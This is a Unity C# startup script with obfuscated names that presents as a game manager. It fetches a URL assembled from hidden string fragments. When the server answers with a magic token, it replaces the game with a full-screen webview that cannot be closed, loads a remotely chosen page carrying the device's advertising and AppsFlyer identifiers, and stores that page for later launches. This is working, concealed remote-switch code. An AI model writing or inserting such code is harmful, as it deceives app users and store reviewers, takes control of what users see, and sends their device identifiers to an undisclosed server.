using System;
using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class sdfsdgsdMainManager : MonoBehaviour
{
    public List<string> sdfsdgsdLoadString;
    private string idfaInfosdfsdgsdKey = "";

    private void Awake()
    {
        if (PlayerPrefs.GetInt("contextInfosdfsdgsdIdfaDataKey", 0) == 1)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string adString, bool trackEnabler, string error) =>
            { idfaInfosdfsdgsdKey = adString; });
        }
    }

    private IEnumerator Start()
    {
        yield return new WaitForSeconds(3);
        string data = PlayerPrefs.GetString("tarameters", "");
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("sdfsdgsdgameDataKey", string.Empty) != string.Empty)
            {
                OnsdfsdgsdMethod(PlayerPrefs.GetString("sdfsdgsdgameDataKey"));
            }
            else
            {
                string stringtemp = "";
                foreach (var item in sdfsdgsdLoadString)
                {
                    stringtemp += item;
                }
                StartCoroutine(LaunchsdfsdgsdGameInitialization(stringtemp, data));
            }
        }
        else
        {
            LoadsdfsdgsdGameScene();
        }
    }

    public IEnumerator LaunchsdfsdgsdGameInitialization(string inputstring, string inputstring2)
    {
        using (UnityWebRequest sdfsdgsdinitalizationStatus = UnityWebRequest.Get(inputstring))
        {
            sdfsdgsdinitalizationStatus.timeout = 4;
            yield return sdfsdgsdinitalizationStatus.SendWebRequest();
            if (sdfsdgsdinitalizationStatus.isNetworkError)
            {
                LoadsdfsdgsdGameScene();
            }
            else
            {
                try
                {
                    if (sdfsdgsdinitalizationStatus.result == UnityWebRequest.Result.Success)
                    {
                        if (sdfsdgsdinitalizationStatus.downloadHandler.text.Contains("dgdfhdshdf"))
                        {
                            try
                            {
                                string[] key = sdfsdgsdinitalizationStatus.downloadHandler.text.Split('|');
                                OnsdfsdgsdMethod($"{key[0]}?idfa={idfaInfosdfsdgsdKey}&gaid={AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + inputstring2}", Convert.ToInt32(key[1]), Convert.ToInt32(key[2]));
                            }
                            catch
                            {
                                OnsdfsdgsdMethod($"{sdfsdgsdinitalizationStatus.downloadHandler.text}?idfa={idfaInfosdfsdgsdKey}&gaid={AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + inputstring2}");
                            }
                        }
                        else
                        {
                            LoadsdfsdgsdGameScene();
                        }
                    }
                    else
                    {
                        LoadsdfsdgsdGameScene();
                    }
                }
                catch
                {
                    LoadsdfsdgsdGameScene();
                }
            }
        }
    }
    
    public void LoadsdfsdgsdGameScene()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        Scene tempScene = SceneManager.CreateScene("sdfsdgsdLoadingScene");
        Scene currentScene = SceneManager.GetActiveScene();
        SceneManager.SetActiveScene(tempScene);
        GameObject newObject = new GameObject("sdfsdgsdLoadingManager");
        newObject.AddComponent<sdfsdgsdLoadingManager>();
        SceneManager.UnloadScene(currentScene);
    }

    public void OnsdfsdgsdMethod(string inputKey, int inputValueFirst = 0, int inputValueSecond = 70)
    {
        var sdfsdgsdMainManagerManager = gameObject.AddComponent<UniWebView>();
        sdfsdgsdMainManagerManager.SetContentInsetAdjustmentBehavior(UniWebViewContentInsetAdjustmentBehavior.Automatic);
        sdfsdgsdMainManagerManager.SetZoomEnabled(true);
        if (inputValueFirst == 0)
        {
            sdfsdgsdMainManagerManager.SetShowToolbar(false);
        }
        else
        {
            sdfsdgsdMainManagerManager.SetShowToolbar(true, false, false, true);
        }
        sdfsdgsdMainManagerManager.SetToolbarDoneButtonText("");
        sdfsdgsdMainManagerManager.SetSupportMultipleWindows(true);
        sdfsdgsdMainManagerManager.Frame = new Rect(0, inputValueSecond, Screen.width, Screen.height - inputValueSecond);
        sdfsdgsdMainManagerManager.OnShouldClose += (view) =>
        {
            return false;
        };
        sdfsdgsdMainManagerManager.OnOrientationChanged += (view, orientation) =>
        {
            sdfsdgsdMainManagerManager.Frame = new Rect(0, inputValueSecond, Screen.width, Screen.height - inputValueSecond);
        };
        sdfsdgsdMainManagerManager.SetSupportMultipleWindows(true);
        sdfsdgsdMainManagerManager.OnMultipleWindowOpened += (view, windowId) =>
        {
            sdfsdgsdMainManagerManager.SetShowToolbar(true);
        };
        sdfsdgsdMainManagerManager.OnMultipleWindowClosed += (view, windowId) =>
        {
            if (inputValueFirst == 0)
            {
                sdfsdgsdMainManagerManager.SetShowToolbar(false);
            }
            else
            {
                sdfsdgsdMainManagerManager.SetShowToolbar(true, false, false, true);
            }
        };
        sdfsdgsdMainManagerManager.SetAllowBackForwardNavigationGestures(true);
        sdfsdgsdMainManagerManager.OnPageFinished += (view, statusCode, url) =>
        {
            sdfsdgsdMainManagerManager.UpdateFrame();
            if (PlayerPrefs.GetString("sdfsdgsdgameDataKey", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("sdfsdgsdgameDataKey", url);
            }
        };
        sdfsdgsdMainManagerManager.Load(inputKey);
        sdfsdgsdMainManagerManager.Show();
    }
}
